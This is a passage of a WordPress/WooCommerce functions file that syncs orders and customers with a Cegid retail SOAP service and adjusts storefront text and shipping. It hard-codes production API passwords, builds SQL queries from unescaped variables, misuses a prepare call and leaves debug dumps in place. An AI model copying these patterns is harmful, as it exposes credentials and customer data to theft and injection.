						$request->createRequest->ShippingTaxes->Create_ShippingTax->Id = "FRL";
						break;
				  }
				  $request->clientContext = new StdClass();
				  $request->clientContext->DatabaseId = "90406010_001_PROD";
				  $res = $order_sale->Create($request);
				  $resultat = json_decode(json_encode($res), true);
				  if (isset($resultat["CreateResult"]["Key"]["Number"])) {
					$orderID = $resultat["CreateResult"]["Key"]["Number"];
				} else {
					$rr = $wpdb->_real_escape(json_encode($request));
					$wpdb->query("INSERT INTO wp_posts VALUES(null, $order_id,4, now(), '$rr')");
					mail($email_alerte, "error Create order " . date("Y-m-d"), json_encode($request));		
				}
			}
			else{
				$request = new StdClass();
				$request->createRequest = new StdClass();
				$request->createRequest->DeliveryAddress = new StdClass();
				$request->createRequest->DeliveryAddress->City        =  $order->get_billing_city();
				$request->createRequest->DeliveryAddress->CountryId   = "TUN";
				$request->createRequest->DeliveryAddress->LastName    = $order->get_billing_last_name();
				$request->createRequest->DeliveryAddress->FirstName   = $order->get_billing_first_name();
				$request->createRequest->DeliveryAddress->Line1       = $order->get_billing_address_1();
				$request->createRequest->DeliveryAddress->Line2       = $order->get_billing_address_2();
				$request->createRequest->DeliveryAddress->Line3       = $order->get_billing_state();
				$request->createRequest->DeliveryAddress->PhoneNumber = $order->get_billing_phone();
				$request->createRequest->DeliveryAddress->ZipCode     = $order->get_billing_postcode();
				$request->createRequest->Header = new StdClass();
				$request->createRequest->Header->Active     = 1;
				$request->createRequest->Header->CustomerId = $CustomerId;
				$request->createRequest->Header->Date       = date("Y-m-d");
				$request->createRequest->Header->ExternalReference = $Id_Order;
				$request->createRequest->Header->InternalReference = $Id_Order;
				$request->createRequest->Header->OmniChannel = new StdClass();      
				$request->createRequest->Header->OmniChannel->BillingStatus   = "Totally";	
				switch ($location_name) {
					case "Mabrouk AZUR City":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "030";
						break;
					case "Mabrouk Nabeul":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "011";
						break;
					case "Mabrouk Jamel abdenaceur":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "005";
						break;
					case "Mabrouk Zéphyr":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "015";
						break;
					case "Mabrouk Sfax":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "009";
					   break;
					case "Mabrouk Sousse":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "029";
						break;
					case "Mabrouk Tunisia Mall":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "021";
						break;
				   case "Mabrouk Lafayette":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "016";
						break;
					case "Mabrouk Menzah 6":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "002";
						break;
					case "Mabrouk Géant":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "024";
						break;
					case "Mabrouk Carrefour":
						$request->createRequest->Header->OmniChannel->DeliveryStoreId = "014";
						break;
				   }
				   $request->createRequest->Header->OmniChannel->DeliveryType   = "PickingUpInStore";
				   $request->createRequest->Header->OmniChannel->FollowUpStatus  = "ToBeProcessed";
				   $request->createRequest->Header->OmniChannel->PaymentStatus   = "Totally";
				   $request->createRequest->Header->OmniChannel->ReturnStatus    = "NotReturned";
				   $request->createRequest->Header->OmniChannel->ShippingStatus  = "Totally"; 
				   $request->createRequest->Header->Origin  = "ECommerce";
				   $request->createRequest->Header->StoreId = "019";
				   $request->createRequest->Header->Type    = "CustomerOrder";
				   $request->createRequest->Lines = new StdClass();
				   $request->createRequest->Lines->Create_Line = array();
				   foreach ($order->get_items() as $item_id => $item) {
					$price =  $order->get_item_subtotal( $item, false, true );
					$variation_id = $item->get_variation_id();
					global $wpdb;
					$wpdb->query("SELECT * FROM wp_postmeta WHERE post_id={$variation_id} and meta_key ='_sku' ");
					$Reference_sku = $wpdb->last_result[0]->meta_value;
					$line = new StdClass();
					$line->ItemIdentifier = new StdClass();
					$line->ItemIdentifier->Reference = $Reference_sku;
					$line->Label        = $item->get_name();
					$line->Origin       = "ECommerce";
					$line->Quantity     =  $item->get_quantity();
					$line->UnitPrice    = $order->get_item_subtotal( $item, false, true );
                    $line->NetUnitPrice = $order->get_line_total( $item, true, true ) / $item->get_quantity();
					$request->createRequest->Lines->Create_Line[] = $line; 
				}
				$request->createRequest->Payments = new StdClass();
				$request->createRequest->Payments->Create_Payment = new StdClass();
				$request->createRequest->Payments->Create_Payment->Amount     = $order->get_total();
				$request->createRequest->Payments->Create_Payment->CurrencyId = "TND";
				$request->createRequest->Payments->Create_Payment->DueDate    = date("Y-m-d");
				$request->createRequest->Payments->Create_Payment->Id         = '1';
				$request->createRequest->Payments->Create_Payment->IsReceivedPayment = 0;
				$request->createRequest->Payments->Create_Payment->MethodId   = "EPD";
				 $request->createRequest->ShippingTaxes = new StdClass();
				 $request->createRequest->ShippingTaxes->Create_ShippingTax = new StdClass();
				 $request->createRequest->ShippingTaxes->Create_ShippingTax->Amount = 0;
				 $request->createRequest->ShippingTaxes->Create_ShippingTax->Id = "FRL";
				 $request->clientContext = new StdClass();
				 $request->clientContext->DatabaseId = "90406010_001_PROD";	
                 $res = $order_sale->Create($request);
				 $resultat = json_decode(json_encode($res), true);
				 if (isset($resultat["CreateResult"]["Key"]["Number"])) {
					 $orderID = $resultat["CreateResult"]["Key"]["Number"];
				 } else {
					 $rr = $wpdb->_real_escape(json_encode($request));
					 $wpdb->query("INSERT INTO wp_posts VALUES(null, $order_id,4, now(), '$rr')");
					 mail($email_alerte, "error Create order " . date("Y-m-d"), json_encode($request));		
				 }		
			}	
		}
	}
	catch (Exception $e){
		$wpdb->query("INSERT INTO wp_posts VALUES(null, $order_id,5, now(), '')");
	}
}
/*** END ORDER + STOCK + CUSTOMER */  

/** END CHECK IF STOCK IS AVAILABLE IN CEGID */

function action_update_customer_detail(){
	if( is_page( 9 ) ){
		
    $user_connected_id = get_current_user_id();
    $UserIdNew = sprintf("%05d",$user_connected_id);
    $user_id = "WSN". $UserIdNew;
    $mail_updated =  $_POST['account_email'];
    $firstNameUpdated =  $_POST['account_first_name'];
    $lastNameUpdated =  $_POST['account_last_name'];

    $url_c = "https://90406010-retail-ondemand.cegid.cloud/Y2/CustomerWcfService.svc";
     $update_customer = new SoapClient( $url_c . "?singleWsdl",
          array(
          "location" => $url_c,
          "login" => "90406010_001_PROD\\CONVERGEN",
          "password" => "12345678"
         )
     
      );
      
      $request = new StdClass();
      $request->customerId = $user_id;
      $request->modifiedData = new StdClass();
      $request->modifiedData->FirstName = $firstNameUpdated;
      $request->modifiedData->LastName = $lastNameUpdated;
      $request->modifiedData->EmailData = new StdClass();
      $request->modifiedData->EmailData->Email = $mail_updated;
      $request->clientContext = new StdClass();
       $request->clientContext->DatabaseId = "90406010_001_PROD";
    // $request->clientContext->DatabaseId = "90406010_002_TEST";
      $resu = $update_customer->UpdateCustomer($request); 
    }
}

add_action('profile_update', 'action_update_customer_detail',10,2);

function ti_custom_javascript() {
    ?>
        <script>
			jQuery( document ).ready(function() {
    			jQuery('#variation_Size .label label').text('Taille :');
				jQuery('#variation_Color .label label').text('Couleur :');
				jQuery('.variation .select>span').text("Choisissez votre taille");

				jQuery('a.cart').click(function() {
  					jQuery('dt.variation-Size').text("Taille :");
				});
					
			jQuery(".wc-order-item-sku strong").text("Codes barres : ");
	jQuery(".wc-order-item-variation strong").text("Référence : ");

				
				jQuery('dt.variation-Size').text("Taille :");
				jQuery('.woo-c_cart_table_item_values p.size .panier-variation').text("Taille :");
				jQuery('.woo-c_cart_table_item_values p.color .panier-variation').text("Couleur :");
					jQuery('a.single_add_to_cart_button').click( function(e) {
						jQuery('#variation_Taille .select span').text('Choisir la taille');
						jQuery('#variation_Couleur .select span').text('Choisir la couleur');
					});
				
				
				const urlSearch = window.location.search;
				switch (urlSearch) {
						  case "?0":
							msg = "Votre Commande est enregistrée, mais pas payé";
							break;
						  case "?1":
							msg = "Le Montant pré-autorisation bloqué (pour le paiement en deux phases)";
							break;
						  case "?2":
							msg = "Le montant a été déposé avec succès";
							break;
						  case "?3":
							msg = "Annulation d'autorisation";
							break;
						  case "?4":
							msg = "La transaction a été remboursé";
							break;
						  case "?5":
							msg = "Autorisation par ACS de l'émetteur initié.";
							break;
						  case  "?6":
							msg = "Votre Autorisation est refusé";
				}
				document.getElementById("msg-failed").innerHTML = "Désolé . " + msg;
				
			});


        </script>
    <?php
}
add_action('wp_head', 'ti_custom_javascript');

add_action( 'woocommerce_sale_flash', 'sale_badge_percentage', 25 );
 
function sale_badge_percentage() {
   global $product;
   if ( ! $product->is_on_sale() ) return;
   if ( $product->is_type( 'simple' ) ) {
      $max_percentage = ( ( $product->get_regular_price() - $product->get_sale_price() ) / $product->get_regular_price() ) * 100;
   } elseif ( $product->is_type( 'variable' ) ) {
      $max_percentage = 0;
      foreach ( $product->get_children() as $child_id ) {
         $variation = wc_get_product( $child_id );
         $price = $variation->get_regular_price();
         $sale = $variation->get_sale_price();
         if ( $price != 0 && ! empty( $sale ) ) $percentage = ( $price - $sale ) / $price * 100;
         if ( $percentage > $max_percentage ) {
            $max_percentage = $percentage;
         }
      }
   }
   if ( $max_percentage > 0 ) echo "<span class='onsales'>Promo: -" . round($max_percentage) . "%</span>"; // If you would like to show -40% off then add text after % sign
}

/**
 * Add or modify States
 */
add_filter( 'woocommerce_states', 'custom_woocommerce_states' );

function custom_woocommerce_states( $states ) {

  $states['TN'] = array(
    'Ariana' => 'Ariana',
    'Beja' => 'Béja',
    'Ben Arous' => 'Ben Arous',
    'Bizerte' => 'Bizerte',
    'Gabes' => 'Gabès',
    'Gafsa' => 'Gafsa',
    'Jendouba' => 'Jendouba',
    'Kairouan' => 'Kairouan',
    'Kasserine' => 'Kasserine',
    'Kebili' => 'Kebili',
    'Kef' => 'Kef',
    'Mahdia' => 'Mahdia',
    'Manouba' => 'Manouba',
    'Medenine' => 'Medenine',
    'Monastir' => 'Monastir',
    'Nabeul' => 'Nabeul',
    'TN017' => 'Sfax',
    'Sidi Bouzid' => 'Sidi Bouzid',
    'Siliana' => 'Siliana',
    'Sousse' => 'Sousse',
    'Tataouine' => 'Tataouine',
    'Tozeur' => 'Tozeur',
    'Tunis' => 'Tunis',
    'Zaghouan' => 'Zaghouan'

  );

  return $states;
}



/**
 * Hide shipping rates when free shipping is available.
 * Updated to support WooCommerce 2.6 Shipping Zones.
 *
 * @param array $rates Array of rates found for the package.
 * @return array
 */
function my_hide_shipping_when_free_is_available( $rates ) {
	$free = array();
	$checkFree = false;
	foreach ( $rates as $rate_id => $rate ) {

			if ( 'free_shipping' === $rate->method_id ) {
			$checkFree = true;
			break;
		}
	}
	foreach ( $rates as $rate_id => $rate ) {
     if ( $checkFree ) { 
		if ( 'free_shipping' === $rate->method_id ) {
			$free[ $rate_id ] = $rate;
		}
		if ('flat_rate' !== $rate->method_id && 'free_shipping' !== $rate->method_id) {
			$free[ $rate_id ] = $rate;
		}
	  }
	}
	return ! empty( $free ) ? $free : $rates;
	
}
add_filter( 'woocommerce_package_rates', 'my_hide_shipping_when_free_is_available', 100 );

add_filter('manage_edit-shop_order_columns','custom_shop_order',100);

function custom_shop_order($columns){
$order_column = array();
foreach ($columns as $key => $column){
$order_column[$key] = $column;
if('order_date' == $key){
	$order_column['transaction_id'] = __('Tracking Number','woocommerce');
}

}
return $order_column;

}

function custom_product_description_content() {
    // Récupérer les liens vers les images depuis une source (remplacez les URL par les vôtres)
    $image_links = array(
        'https://mabrouk.tn/wp-content/uploads/2024/12/35.png' => 'NE PAS SECHER EN MACHINE',
        'https://mabrouk.tn/wp-content/uploads/2024/12/9.png' => 'LAVABLE EN MACHINE MAX 30°C FRAGILE',
        'https://mabrouk.tn/wp-content/uploads/2024/12/14.png' => 'EAU DE JAVEL INTERDITE',
        'https://mabrouk.tn/wp-content/uploads/2024/12/19.png' => 'REPASSER MAX 110°C',
    );

    // Afficher un div vide au-dessus de la liste d'images
    
    echo '<ul class="product-images-list">';
    foreach ($image_links as $image_link => $image_caption) {
        echo '<li><a href="' . esc_url($image_link) . '" data-title="' . esc_attr($image_caption) . '"><img src="' . esc_url($image_link) . '" alt="Image"></a></li>';
    }
    echo '</ul>';
echo '<div id="image-caption"></div>';
    // Ajouter du JavaScript/jQuery pour afficher les légendes
    echo '<script>
        jQuery(document).ready(function($) {
            $(".product-images-list a").hover(function() {
                var caption = $(this).attr("data-title");
                $("#image-caption").text(caption);
            }, function() {
                $("#image-caption").text("");
            });
        });
    </script>';
}

add_action('woocommerce_single_product_summary', 'custom_product_description_content', 15);



// Supprimer les tailles d'images non nécessaires
function remove_additional_image_sizes($sizes) {
    // Supprime les tailles d'images spécifiques
    unset($sizes['medium_large']);
    unset($sizes['large']);
    unset($sizes['full']);

    return $sizes;
}
add_filter('intermediate_image_sizes_advanced', 'remove_additional_image_sizes');


function adjust_image_sizes($sizes) {
    // Supprimer toutes les tailles d'images sauf la taille de miniature (thumbnail)
    $sizes = array('thumbnail','medium');

    return $sizes;
}
add_filter('intermediate_image_sizes', 'adjust_image_sizes');

function custom_scriptss() {
    ?>
    <script type="text/javascript">
        jQuery(document).ready(function(jQuery) {
            jQuery('.woocommerce-tabs.wc-tabs-wrapper.tabNav_wrapper ul.tabs.wc-tabs.tabNav li:nth-child(2) .font-titles').text('Matière');
        });
    </script>
    <?php
}
add_action('wp_footer', 'custom_scriptss');


// add_action( 'woocommerce_view_order', 'my_custom_content_for_view_order' );

function my_custom_content_for_view_order( $order_id ) {
    $url_client = "https://90406010-retail-ondemand.cegid.cloud/Y2/SaleDocumentService.svc?singleWsdl";
    $login = "90406010_001_PROD\\foued";
    $password = "12trois4";

    $xml = <<<XML
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="http://www.cegid.fr/Retail/1.0"> 
 <soapenv:Header/> 
 <soapenv:Body> 
 <ns:Update> 
 <ns:updateRequest> 
 <ns:Header> 
 <ns:Active>1</ns:Active> 
 <ns:Comment>CREATE DOCUMENT</ns:Comment> 
 <ns:CustomerId>WSN00005</ns:CustomerId> 
 <ns:Date>2024-07-02</ns:Date> 
 <ns:InternalReference>1126598</ns:InternalReference> 
 <ns:OmniChannel> 
 <ns:BillingStatus>Totally</ns:BillingStatus> 
 <ns:DeliveryType>ShipByCentral</ns:DeliveryType> 
 <ns:FollowUpStatus>ToBeProcessed</ns:FollowUpStatus> 
 <ns:PaymentStatus>Totally</ns:PaymentStatus> 
 <ns:ReturnStatus>NotReturned</ns:ReturnStatus> 
 <ns:ShippingStatus>Totally</ns:ShippingStatus> 
 </ns:OmniChannel> 
 <ns:Origin>ECommerce</ns:Origin> 
 <ns:StoreId>019</ns:StoreId> 
 <ns:Type>CustomerOrder</ns:Type> 
 </ns:Header> 
 <ns:Identifier> 
 <ns:Reference> 
 <ns:CustomerId>WSN00005</ns:CustomerId> 
 <ns:InternalReference>1126598</ns:InternalReference> 
 <ns:Type>CustomerOrder</ns:Type> 
 </ns:Reference> 
 </ns:Identifier> 
 <ns:Lines> 
 <ns:Update_Line> 
 <ns:ItemIdentifier> 
 <ns:Reference>6191114187658</ns:Reference>
 </ns:ItemIdentifier> 
 <ns:Label>VESTE FOUENCAMPS - S, CREME</ns:Label> 
 <ns:NetUnitPrice>69.9</ns:NetUnitPrice>  
 <ns:Origin>ECommerce</ns:Origin> 
 <ns:Quantity>4</ns:Quantity> 
 </ns:Update_Line> 
 </ns:Lines> 
 <ns:Payments> 
 <ns:Update_Payment> 
 <ns:Amount>279.6</ns:Amount> 
 <ns:CurrencyId>TND</ns:CurrencyId>  
 <ns:DueDate>2024-07-02</ns:DueDate>  
 <ns:Id>1</ns:Id> 
 <ns:IsReceivedPayment>0</ns:IsReceivedPayment>  
 <ns:MethodId>ECA</ns:MethodId>  
 </ns:Update_Payment> 
 </ns:Payments> 
 </ns:updateRequest> 
 <ns:clientContext> 
 <ns:DatabaseId>90406010_001_PROD</ns:DatabaseId>  
 </ns:clientContext> 
 </ns:Update> 
 </soapenv:Body> 
</soapenv:Envelope>
XML;

    $options = array(
        'login' => $login,
        'password' => $password,
        'trace' => 1,
        'exception' => 1
    );

    try {
        $client = new SoapClient($url_client, $options);
        $action = "http://www.cegid.fr/Retail/1.0/ISaleDocumentService/Update"; // Correct SOAP action URI
        $response = $client->__doRequest($xml, $url_client, $action, 1);

        if ($response) {
            echo "<div class='woocommerce-message'>SOAP Response:</div>";
            echo "<pre>" . htmlentities($response) . "</pre>";
        } else {
            throw new Exception("No response from SOAP server");
        }
    } catch (SoapFault $fault) {
        echo "<div class='woocommerce-error'>SOAP Error: " . $fault->getMessage() . "</div>";
    } catch (Exception $e) {
        echo "<div class='woocommerce-error'>Error: " . $e->getMessage() . "</div>";
    }
}

function custom_tab_script() {
    ?>
    <script type="text/javascript">
        jQuery(document).ready(function(jQuery) {
            // Sélectionnez la première tab et son contenu
            var $firstTab = jQuery('.tabNav_link[data-stockie-tab="description"]');
            var $firstTabContent = jQuery('.tabItems_item[data-stockie-tab-content="description"]');

            // Sélectionnez la deuxième tab et son contenu
            var $secondTab = jQuery('.tabNav_link[data-stockie-tab="additional_information"]');
            var $secondTabContent = jQuery('.tabItems_item[data-stockie-tab-content="additional_information"]');

            if ($firstTabContent.text().trim() === "VIDE") {
                // Si le contenu de la première tab est vide, masquez le premier tab
                $firstTab.hide();
                $firstTabContent.hide(); 

                // Ajoutez la classe "active" à la deuxième tab
                $secondTab.addClass('active');
                jQuery('.woocommerce-tabs.wc-tabs-wrapper.tabNav_wrapper ul.tabs.wc-tabs.tabNav li:nth-child(2) .font-titles').text('Composition');
            } else {
                $secondTab.removeClass('active');
                $secondTabContent.removeClass('active');

                // Ajoutez la classe "active" à la première tab et à son contenu
                $firstTab.addClass('active');
                $firstTabContent.addClass('active');
            }
            
            
        });
        jQuery(document).ready(function() {
    jQuery("#billing_state option[value='']").prop("selected", true);
});
    </script>
    <?php
}

add_action('wp_footer', 'custom_tab_script');


function create_new_customers($customer_id) {
     $lastcut = sprintf("%05d", $customer_id);
     $mycustomer = "W" . $lastcut;
     $user_info = get_userdata($customer_id);
         var_dump("EE",$user_info);
         die;
     $url_customer = "https://90406010-retail-ondemand.cegid.cloud/Y2/CustomerWcfService.svc";
     $client = new SoapClient(
             $url_customer . "?singleWsdl",
            array(
                "location" => $url_customer,
                "login" => "90406010_001_PROD\CONVERGEN",
                 "password" => "12345678",
                 "trace" => true
             )
        );

      try {
          $requestCC = new StdClass();
         $requestCC->customerData = new StdClass();
        $requestCC->customerData->AddressData = new StdClass();
          $requestCC->customerData->AddressData->AddressLine1 = "";
          $requestCC->customerData->AddressData->City = "tunis";
          $requestCC->customerData->AddressData->CountryId = "TUN";
          $requestCC->customerData->AddressData->CountryIdType = "Internal";
          $requestCC->customerData->AddressData->ZipCode = "";
          $requestCC->customerData->EmailData = new StdClass();
          $requestCC->customerData->EmailData->Email = $email;
         $requestCC->customerData->EmailData->EmailingAccepted = true;
        $requestCC->customerData->FirstName = $first_name;
         $requestCC->customerData->IsCompany = false;
         $requestCC->customerData->LastName = $last_name;

         $requestCC->customerData->PhoneData = new StdClass();
          $requestCC->customerData->PhoneData->AlternativePhoneNumber = "";
          $requestCC->customerData->PhoneData->CellularPhoneNumber = "";
         $requestCC->customerData->CustomerId = $mycustomer;
         var_dump("CC", $requestCC);
          $requestCC->clientContext = new StdClass();
          $requestCC->clientContext->DatabaseId = "90406010_001_PROD";
          var_dump("testcc",$requestCC);
         $resu = $client->AddNewCustomer($requestCC);
         var_dump("ALA",$resu);
         die;
         $resultat = json_decode(json_encode($resu), true);
         if (isset($resultat["AddNewCustomerResult"])) {              $CustomerId = $resultat["AddNewCustomerResult"];

          } else {

              global $wpdb;
              $rr = $wpdb->prepare("%s", json_encode($requestCC)); // Utilisation de prepare pour éviter les attaques SQL
              $wpdb->query("INSERT INTO wp_posts VALUES(null, $order_id, 3, now(), '$rr')");
            $email_alerte = "abfcd@gmail.com"; // Remplacez par votre adresse e-mail
             $email_client = "abfcd@gmail.com"; // Remplacez par l'e-mail du client
             mail($email_alerte, "error AddNewCustomer  " . $email_client, json_encode($requestCC)); // Assurez-vous que votre serveur est configuré pour envoyer des e-mails        
}
     } catch (SoapFault $e) {
    echo "Erreur SOAP : " . $e->getMessage();
 } catch (Exception $e) {
     echo "Erreur AA : " . $e->getMessage();
 }
}


// add_action('woocommerce_created_customer', 'create_new_customers',10,1);

function custom_disable_add_to_cart_button() {
    ?>
    <script type="text/javascript">
        jQuery(document).ready(function($) {
            // Vérifier si le message de rupture de stock est présent
            var outOfStockMessage = $('.single_variation_wrap .wc-no-matching-variations').text().trim();
            if (outOfStockMessage === "Ce produit est en rupture de stock") {
                // Sélectionner le bouton "Ajouter au panier"
                var addToCartButton = $('.single_add_to_cart_button');
                if (addToCartButton.length) {
                    // Désactiver le bouton et ajouter une classe pour indiquer qu'il est désactivé
                    addToCartButton.prop('disabled', true);
                    addToCartButton.addClass('disabled');
                }
            }
        });
    </script>
    <?php
}
add_action('wp_footer', 'custom_disable_add_to_cart_button');

?>